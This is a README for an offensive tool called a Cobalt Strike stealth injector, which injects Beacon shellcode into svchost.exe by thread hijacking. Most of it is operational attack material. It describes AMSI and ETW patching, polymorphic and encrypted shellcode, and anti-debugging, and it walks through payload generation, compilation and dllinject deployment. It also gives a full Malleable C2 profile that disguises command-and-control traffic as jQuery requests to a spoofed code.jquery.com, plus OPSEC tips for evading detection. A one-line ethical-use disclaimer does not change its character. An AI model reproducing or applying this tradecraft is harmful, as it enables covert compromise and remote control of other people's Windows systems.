# Cobalt Strike Stealth Injector

This repository provides a custom Cobalt Strike artifact designed for educational purposes, showcasing advanced stealth techniques for payload delivery in 2025. Implemented as a reflective DLL, it injects Beacon shellcode into a target process (e.g., `svchost.exe`) using Thread Hijacking, with features like AES-256 encryption, polymorphic shellcode, dynamic key generation, and string obfuscation. The artifact integrates with Malleable C2 profiles, inspired by threatexpress/malleable-c2, to mimic legitimate network traffic, such as jQuery requests.

## Features

- **Thread Hijacking**: Injects shellcode into an existing thread for minimal detection footprint.
- **AES-256 Encryption**: Secures shellcode with keys derived from system time and Malleable C2 parameters.
- **Polymorphic Shellcode**: Applies runtime bit-shifting and XOR transformations to evade signatures.
- **String Obfuscation**: Encrypts critical strings (e.g., process/library names) with dynamic keys.
- **AMSI and ETW Bypass**: Patches Antimalware Scan Interface and Event Tracing for Windows to prevent scanning and logging.
- **Anti-Debugging**: Detects debuggers and sandboxes via timing and environmental checks.
- **Malleable C2 Integration**: Supports dynamic process selection and key configuration via profiles like `jquery-c2.4.9.profile`.
- **Reflective DLL Loading**: Enables file-less execution for enhanced stealth.

## Requirements

- **Cobalt Strike**: Version 4.9 or later with a valid license.
- **SysWhispers3**: Library for dynamic system calls.
- **Compiler**: Visual Studio (with MASM) or MinGW-w64 (`x86_64-w64-mingw32-gcc`).
- **Windows**: x64 environment (Windows 10/11, tested up to 24H2).
- **Dependencies**: `bcrypt` for AES encryption (included in Windows).

## Setup

1. **Clone the Repository**:

   ```bash
   git clone https://github.com/yourusername/cobalt-strike-stealth-injector.git
   cd cobalt-strike-stealth-injector
   ```
2. **Install SysWhispers3**:
   - Generate syscall stubs:

     ```bash
     python syswhispers.py -f NtOpenProcess,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtClose,NtOpenThread,NtSuspendThread,NtGetContextThread,NtSetContextThread,NtResumeThread -o syswhispers3
     ```
   - Include `syswhispers3.h` and `syswhispers3.c` in the project directory.
3. **Generate Beacon Shellcode**:
   - In Cobalt Strike, navigate to *Attacks &gt; Packages &gt; Payload Generator*.
   - Select *Windows DLL (x64)*, apply your Malleable C2 profile, and save the output as `beacon.bin`.
   - Convert to a C array:

     ```bash
     xxd -i beacon.bin > beacon.h
     ```
   - Replace the `payload` array in `beacon_injector.c` with the generated array.
4. **Configure Malleable C2**:
   - Create a profile inspired by `jquery-c2.4.9.profile` from threatexpress/malleable-c2:

     ```plaintext
     set data_transform "prepend {base_key=0102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F20};";
     set process-inject "svchost.exe";
     set host_stage "false";
     set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0";
     http-get {
       set uri "/jquery-3.3.1.slim.min.js";
       client {
         header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
         header "Host" "code.jquery.com";
         header "Referer" "http://code.jquery.com/";
         header "Accept-Encoding" "gzip, deflate";
       }
       server {
         output {
           prepend "data=";
           print;
         }
       }
     }
     http-post {
       set uri "/submit";
       client {
         id {
           parameter "session";
         }
         output {
           print;
         }
       }
     }
     process-inject {
       set allocator "VirtualAllocEx";
       set min_alloc "4096";
       set startrwx "false";
       set userwx "false";
     }
     transform-x64 {
       prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90";
       strrep "ReflectiveLoader" "execute";
       strrep "beacon.x64.dll" "";
       stringw "jQuery";
     }
     post-ex {
       set cleanup "true";
     }
     ```
   - Load the profile in Cobalt Strike:

     ```bash
     ./teamserver [external IP] [password] [/path/to/profile]
     ```
   - Validate with:

     ```bash
     ./c2lint /path/to/profile
     ```

## Compilation

- **Visual Studio**:

  ```bash
  cl /c beacon_injector.c syswhispers3.c
  link /DLL beacon_injector.obj syswhispers3.obj /out:beacon_injector.dll
  ```
- **MinGW-w64**:

  ```bash
  x86_64-w64-mingw32-gcc beacon_injector.c syswhispers3.c -o beacon_injector.dll -shared -lbcrypt
  ```

## Usage

1. **Deploy the Artifact**:
   - **Reflective Loading**: Use Cobalt Strike's reflective DLL injection to load `beacon_injector.dll` into a target process:

     ```plaintext
     dllinject [pid] beacon_injector.dll
     ```
   - **Classic Loading**: Inject the DLL using `LoadLibrary` via an exploit or script. Optionally pass a target process name (e.g., `explorer.exe`) through the loader.
2. **Execution**:
   - The DLL locates the target process (default: `svchost.exe`), decrypts the shellcode, applies polymorphism, patches AMSI/ETW, and performs Thread Hijacking to execute the payload.
   - Beacon connects to the C2 server, mimicking jQuery traffic as defined in the Malleable C2 profile.
3. **Testing**:
   - Test in a controlled environment (e.g., Windows 11 24H2 VM) without EDR.
   - Monitor injection with Process Explorer or Procmon.
   - Verify network traffic with Wireshark to ensure it aligns with the jQuery-like profile.
4. **OPSEC Considerations**:
   - Disable staging (`set host_stage "false";`) to minimize detection risks.
   - Use a trusted SSL certificate or a self-signed certificate mimicking a legitimate domain (e.g., `code.jquery.com`).
   - Adjust `sleeptime` and `jitter` to blend with target network traffic.
   - Ensure `process-inject` settings use RW/RX memory to avoid RWX flags, which are suspicious.

## Ethical Use

This project is for educational purposes and authorized security testing only. Unauthorized use may violate laws and regulations. Always obtain explicit permission before deploying in any environment.

## Contributing

Submit issues or pull requests for enhancements, such as additional stealth techniques, support for other injection methods, or optimizations.

## License

This project is licensed under the MIT License. See the `LICENSE` file for details.

## Acknowledgments

- Inspired by threatexpress/malleable-c2 for Malleable C2 profile guidance and jQuery traffic emulation.
- Thanks to the Cobalt Strike community for advancing stealth and OPSEC techniques.
